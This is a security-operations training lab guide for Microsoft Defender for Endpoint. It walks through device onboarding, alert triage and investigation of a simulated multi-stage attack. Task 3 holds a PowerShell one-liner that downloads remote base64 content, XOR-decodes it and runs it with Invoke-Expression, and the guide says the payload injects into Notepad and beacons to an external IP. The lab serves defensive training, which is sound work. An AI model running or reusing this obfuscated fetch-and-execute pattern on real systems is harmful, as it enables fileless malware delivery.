
# Module 4 - Lab 1 - Exercise 2 - Mitigate Attacks with Microsoft Defender for Endpoint

## Lab scenario

You are a Security Operations Analyst working at a company that is implementing Microsoft Defender for Endpoint. Your manager plans to onboard a few devices to provide insight into required changes to the Security Operations (SecOps) team response procedures.

To explore the Defender for Endpoint attack mitigation capabilities, you will run two simulated attacks.

## Lab objectives
 In this lab, you will perform the following:
- Task 1: Verify Device onboarding
- Task 2: Investigate alerts and incidents
- Task 3: Simulate an Attack
- Task 4: Investigate the simulated attack as a single incident

## Estimated timing: 60 minutes

  ![](../Media/Mod4_L1_Ex2.png)
  
### Task 1: Verify Device onboarding

In this task, you will confirm that the device is onboarded successfully and create a test alert.

1. If you are not already at the Microsoft Defender XDR portal in your Microsoft Edge browser, go to (https://security.microsoft.com) and log in as Admin for your tenant.

1. In the left-hand menu, under the **Assets** area, select **Devices**. Please wait until a device appears on the Devices page before you continue. Otherwise, you might need to repeat this task to see the alerts that will be generated later.

    ![Picture 1](../Media/vm1.png)

    >**Note:** If you have completed the onboarding process and don't see devices in the Devices list after an hour, it might indicate an onboarding or connectivity problem.

1. Select **Settings** from the left menu bar, then from the Settings page select **Endpoints**.

    ![Picture 1](../Media/endpt1.png)

1. Select **Onboarding** in the Device Management section and make sure *"Windows 10 and 11"* is selected as an operating system. The *"First device onboarded"* message now shows *Completed*.

1. Scroll down and under the section *"2. Run a detection test"*, copy the detection test script by selecting the **Copy** button.  

1. In the Windows search bar of the WIN1 virtual machine, type **CMD** and choose **Run as Administrator** on the right pane for the Command Prompt app.

    ![Picture 1](../Media/pwrshell.png)

1. When the "User Account Control" window is shown, select **Yes** to allow the app to run. 

1. Paste the script by right-clicking in the **Administrator: Command Prompt** windows and press **Enter** to run it.

    > **Note:** The window closes automatically after successfully running the script, and after a few minutes alerts are generated in the Microsoft Defender XDR portal.

### Task 2: Investigate alerts and incidents

In this task, you will investigate the alerts and incidents generated by the onboarding detection test script in the previous task.

1. In the Microsoft Defender XDR portal select **Incidents & alerts** from the left menu bar, then select **Alerts**.

1. In the **Alerts** pane, select the alert named *Suspicious PowerShell commandline* to load its details.


1. Review the *Alert story* timeline, and then review the *Details* and *Recommendations* tabs.

1. Under the alert **View Alert Details** tab you can scroll down to the *Incident details* section and select the **Suspicious Powershell command line on one endpoint** link to open the incident.

1. Select the **Manage incident** link (with a pencil icon) and a new window blade appears.

    ![Picture 1](../Media/2024-07-18.png)

1. Select the toggle **Assign to**  and add your user account (Me) as the owner of the incident.

1. Under **Classification**, expand the drop-down menu.

1. Under **Informational, expected activity**, select **Security testing**.

1. Add any comments if desired and select **Save** to update the incident and Close.

    ![Picture 1](../Media/newcop.png)

1. Review the contents of the *Attack story, Alerts, Assets, Investigations, Evidence and Response*, and *Summary* tabs. Devices and Users are under the *Assets* tab. In a real incident, the *Attack story* tab displays the *Incident graph*. **Hint:** Some tabs might be hidden due to the size of your display. Select the ellipsis tab (...) to make them appear.

  > **Congratulations** on completing the task! Now, it's time to validate it. Here are the steps:
  > - Hit the Validate button for the corresponding task. You can proceed to the next task if you receive a success message.
  > - If not, carefully read the error message and retry the step, following the instructions in the lab guide.
  > - If you need any assistance, please contact us at labs-support@spektrasystems.com. We are available 24/7 to help you out.

  <validation step="698fed0a-fe5f-42a4-ae1c-7b77559325fc" />


### Task 3: Simulate an Attack

> **Warning:** This simulated attack is an excellent source of learning through practice. Only perform the attack in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant.

In this task, you will simulate an attack on the WIN1 virtual machine and verify that the attack is detected and mitigated by Microsoft Defender for Endpoint.

1. On the WIN1 virtual machine, *right-click* the **Start** button and choose **Windows PowerShell (Admin)**.

1. When the "User Account Control" window is shown, select **Yes** to allow the app to run.

1. Copy and paste the following simulation script into the PowerShell window and press **Enter** to run it:

    ```PowerShell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
    $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
    $base64String = (Invoke-WebRequest -URI "https://raw.githubusercontent.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst/refs/heads/master/Allfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} }; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```

    >**Note:** If you experience errors (in red) while running the script, you can open the Notepad app and copy the script into a blank file. Make sure *word wrap* is turned on in Notepad. Then, copy and run each line of the script separately in PowerShell. Also, a PowerShell script (attacksim.ps1) was provided in the files downloaded at the beginning of the labs. To use the script, in **Windows PowerShell (Admin)** navigate to the *\Users\Admin\Desktop\Allfiles* folder and type *.\attacksim.ps1* and press **Enter** to run it.


1. The script will produce several lines of output and a message that it *Failed to resolve Domain Controllers in the domain*. A few seconds later, the *Notepad* app will open. A simulated attack code will be injected into Notepad. Keep the automatically generated Notepad instance open to experience the full scenario. The simulated attack code will attempt to communicate to an external IP address (simulating a C2 server).

### Task 4: Investigate the simulated attack as a single incident

1. In the Microsoft Defender XDR portal select **Incidents & alerts** from the left menu bar, then select **Incidents**.

1. A new incident called *Multi-stage incident involving Defense evasion & Discovery on one endpoint* is in the right pane. Select the incident name to load its details.

1. Under the *Attack story* tab, view the **Alerts** and **Incident details** panes to view the full **Incident graph**.

1. Mouse over and select the **Incident graph nodes** to review the *entities*.

1. Under the *Attack story* tab **Alerts** section (left-side) and select the **Play attack story** *Run* icon. This shows the attack timeline alert by alert and dynamically populates the *Incident graph*.

1. Review the contents of the *Attack story, Alerts, Assets, Investigations, Evidence and Response*, and *Summary* tabs. Devices and Users are under the *Assets* tab. **Hint:** Some tabs might be hidden due to the size of your display. Select the ellipsis tab (...) to make them appear.

1. Under the **Evidence and Response** tab, select **IP addresses** then select the displayed *IP address*. In the pop-up window review the IP address details scroll down and select the **Open IP address page** button.

1. Review the contents of the *Ip address* page *Overview, Incidents & alerts and Observed in organizations* tabs. Some tabs may not contain any information about the IP address.


## Review
In this lab, you have completed the following:
- Ran Simulated Attacks
- Investigated the Attacks
- Simulated an Attack
- Investigated the simulated attack as a single incident

## You have successfully completed the lab.

